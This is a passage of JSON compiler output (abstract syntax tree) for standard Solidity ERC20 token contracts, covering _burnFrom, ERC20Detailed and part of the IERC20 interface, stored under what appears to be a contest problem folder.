													"nodeType": "ElementaryTypeName",
													"src": "7120:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7087:47:1"
									},
									"returnParameters": {
										"id": 903,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7144:0:1"
									},
									"scope": 966,
									"src": "7070:335:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 964,
										"nodeType": "Block",
										"src": "7651:127:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 945,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 939,
															"src": "7668:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 946,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 941,
															"src": "7677:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 944,
														"name": "_burn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 895,
														"src": "7662:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256)"
														}
													},
													"id": 947,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7662:22:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 948,
												"nodeType": "ExpressionStatement",
												"src": "7662:22:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 950,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 939,
															"src": "7704:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 951,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "7713:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 952,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "7713:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 960,
																	"name": "amount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 941,
																	"src": "7762:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"baseExpression": {
																			"argumentTypes": null,
																			"id": 953,
																			"name": "_allowances",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 606,
																			"src": "7725:11:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																				"typeString": "mapping(address => mapping(address => uint256))"
																			}
																		},
																		"id": 955,
																		"indexExpression": {
																			"argumentTypes": null,
																			"id": 954,
																			"name": "account",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 939,
																			"src": "7737:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"isConstant": false,
																		"isLValue": true,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "IndexAccess",
																		"src": "7725:20:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 958,
																	"indexExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 956,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1241,
																			"src": "7746:3:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 957,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "7746:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "7725:32:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 959,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 1145,
																"src": "7725:36:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 961,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7725:44:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 949,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 937,
														"src": "7695:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 962,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7695:75:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 963,
												"nodeType": "ExpressionStatement",
												"src": "7695:75:1"
											}
										]
									},
									"documentation": "@dev Destoys `amount` tokens from `account`.`amount` is then deducted\nfrom the caller's allowance.\n\n     * See {_burn} and {_approve}.",
									"id": 965,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_burnFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 942,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 939,
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 965,
												"src": "7609:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 938,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7609:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 941,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 965,
												"src": "7626:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 940,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7626:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7608:33:1"
									},
									"returnParameters": {
										"id": 943,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7651:0:1"
									},
									"scope": 966,
									"src": "7590:188:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 967,
							"src": "1256:6531:1"
						}
					],
					"src": "0:7787:1"
				},
				"id": 1
			},
			"赛题-预赛/第四题/contracts/ERC20Detailed.sol": {
				"ast": {
					"absolutePath": "赛题-预赛/第四题/contracts/ERC20Detailed.sol",
					"exportedSymbols": {
						"ERC20Detailed": [
							1024
						]
					},
					"id": 1025,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 968,
							"literals": [
								"solidity",
								"^",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:2"
						},
						{
							"absolutePath": "赛题-预赛/第四题/contracts/IERC20.sol",
							"file": "./IERC20.sol",
							"id": 969,
							"nodeType": "ImportDirective",
							"scope": 1025,
							"sourceUnit": 1094,
							"src": "27:22:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 970,
										"name": "IERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1093,
										"src": "142:6:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IERC20_$1093",
											"typeString": "contract IERC20"
										}
									},
									"id": 971,
									"nodeType": "InheritanceSpecifier",
									"src": "142:6:2"
								}
							],
							"contractDependencies": [
								1093
							],
							"contractKind": "contract",
							"documentation": "@dev Optional functions from the ERC20 standard.",
							"fullyImplemented": false,
							"id": 1024,
							"linearizedBaseContracts": [
								1024,
								1093
							],
							"name": "ERC20Detailed",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 973,
									"name": "_name",
									"nodeType": "VariableDeclaration",
									"scope": 1024,
									"src": "156:20:2",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 972,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "156:6:2",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 975,
									"name": "_symbol",
									"nodeType": "VariableDeclaration",
									"scope": 1024,
									"src": "183:22:2",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 974,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "183:6:2",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 977,
									"name": "_decimals",
									"nodeType": "VariableDeclaration",
									"scope": 1024,
									"src": "212:23:2",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint8",
										"typeString": "uint8"
									},
									"typeName": {
										"id": 976,
										"name": "uint8",
										"nodeType": "ElementaryTypeName",
										"src": "212:5:2",
										"typeDescriptions": {
											"typeIdentifier": "t_uint8",
											"typeString": "uint8"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 998,
										"nodeType": "Block",
										"src": "511:89:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 988,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 986,
														"name": "_name",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 973,
														"src": "522:5:2",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 987,
														"name": "name",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 979,
														"src": "530:4:2",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "522:12:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 989,
												"nodeType": "ExpressionStatement",
												"src": "522:12:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 992,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 990,
														"name": "_symbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 975,
														"src": "545:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 991,
														"name": "symbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 981,
														"src": "555:6:2",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "545:16:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 993,
												"nodeType": "ExpressionStatement",
												"src": "545:16:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 996,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 994,
														"name": "_decimals",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 977,
														"src": "572:9:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 995,
														"name": "decimals",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 983,
														"src": "584:8:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														}
													},
													"src": "572:20:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"id": 997,
												"nodeType": "ExpressionStatement",
												"src": "572:20:2"
											}
										]
									},
									"documentation": "@dev Sets the values for `name`, `symbol`, and `decimals`. All three of\nthese values are immutable: they can only be set once during\nconstruction.",
									"id": 999,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 984,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 979,
												"name": "name",
												"nodeType": "VariableDeclaration",
												"scope": 999,
												"src": "446:18:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 978,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "446:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 981,
												"name": "symbol",
												"nodeType": "VariableDeclaration",
												"scope": 999,
												"src": "466:20:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 980,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "466:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 983,
												"name": "decimals",
												"nodeType": "VariableDeclaration",
												"scope": 999,
												"src": "488:14:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 982,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "488:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "445:58:2"
									},
									"returnParameters": {
										"id": 985,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "511:0:2"
									},
									"scope": 1024,
									"src": "433:167:2",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1006,
										"nodeType": "Block",
										"src": "722:31:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1004,
													"name": "_name",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 973,
													"src": "740:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"functionReturnParameters": 1003,
												"id": 1005,
												"nodeType": "Return",
												"src": "733:12:2"
											}
										]
									},
									"documentation": "@dev Returns the name of the token.",
									"id": 1007,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1000,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "683:2:2"
									},
									"returnParameters": {
										"id": 1003,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1002,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1007,
												"src": "707:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1001,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "707:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "706:15:2"
									},
									"scope": 1024,
									"src": "670:83:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1014,
										"nodeType": "Block",
										"src": "926:33:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1012,
													"name": "_symbol",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 975,
													"src": "944:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"functionReturnParameters": 1011,
												"id": 1013,
												"nodeType": "Return",
												"src": "937:14:2"
											}
										]
									},
									"documentation": "@dev Returns the symbol of the token, usually a shorter version of the\nname.",
									"id": 1015,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1008,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "887:2:2"
									},
									"returnParameters": {
										"id": 1011,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1010,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1015,
												"src": "911:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1009,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "911:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "910:15:2"
									},
									"scope": 1024,
									"src": "872:87:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1022,
										"nodeType": "Block",
										"src": "1570:35:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1020,
													"name": "_decimals",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 977,
													"src": "1588:9:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"functionReturnParameters": 1019,
												"id": 1021,
												"nodeType": "Return",
												"src": "1581:16:2"
											}
										]
									},
									"documentation": "@dev Returns the number of decimals used to get its user representation.\nFor example, if `decimals` equals `2`, a balance of `505` tokens should\nbe displayed to a user as `5,05` (`505 / 10 ** 2`).\n\n     * Tokens usually opt for a value of 18, imitating the relationship between\nEther and Wei.\n\n     * NOTE: This information is only used for _display_ purposes: it in\nno way affects any of the arithmetic of the contract, including\n{IERC20-balanceOf} and {IERC20-transfer}.",
									"id": 1023,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1016,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1539:2:2"
									},
									"returnParameters": {
										"id": 1019,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1018,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1023,
												"src": "1563:5:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1017,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1563:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1562:7:2"
									},
									"scope": 1024,
									"src": "1522:83:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 1025,
							"src": "116:1492:2"
						}
					],
					"src": "0:1612:2"
				},
				"id": 2
			},
			"赛题-预赛/第四题/contracts/IERC20.sol": {
				"ast": {
					"absolutePath": "赛题-预赛/第四题/contracts/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							1093
						]
					},
					"id": 1094,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1026,
							"literals": [
								"solidity",
								"^",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:3"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": "@dev Interface of the ERC20 standard as defined in the EIP. Does not include\nthe optional functions; to access them see {ERC20Detailed}.",
							"fullyImplemented": false,
							"id": 1093,
							"linearizedBaseContracts": [
								1093
							],
							"name": "IERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": "@dev Returns the amount of tokens in existence.",
									"id": 1031,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1027,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "300:2:3"
									},
									"returnParameters": {
										"id": 1030,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1029,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1031,
												"src": "326:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1028,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "326:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "325:9:3"
									},
									"scope": 1093,
									"src": "280:55:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": "@dev Returns the amount of tokens owned by `account`.",
									"id": 1038,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1034,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1033,
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 1038,
												"src": "442:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1032,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "442:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "441:17:3"
									},
									"returnParameters": {
										"id": 1037,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1036,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1038,
												"src": "482:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1035,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "482:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "481:9:3"
									},
									"scope": 1093,
									"src": "423:68:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": "@dev Moves `amount` tokens from the caller's account to `recipient`.\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     * Emits a {Transfer} event.",
									"id": 1047,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1043,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1040,
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"scope": 1047,
												"src": "738:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1039,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "738:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1042,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 1047,
												"src": "757:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1041,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "757:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "737:35:3"
									},
									"returnParameters": {
										"id": 1046,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1045,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1047,
												"src": "791:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1044,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "791:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "790:6:3"
									},
									"scope": 1093,
									"src": "720:77:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": "@dev Returns the remaining number of tokens that `spender` will be\nallowed to spend on behalf of `owner` through {transferFrom}. This is\nzero by default.\n\n     * This value changes when {approve} or {transferFrom} are called.",
									"id": 1056,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1052,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1049,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1056,
												"src": "1100:13:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1048,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1100:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1051,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1056,
												"src": "1115:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1050,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1115:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1099:32:3"
									},
									"returnParameters": {
										"id": 1055,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1054,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1056,
												"src": "1155:7:3",
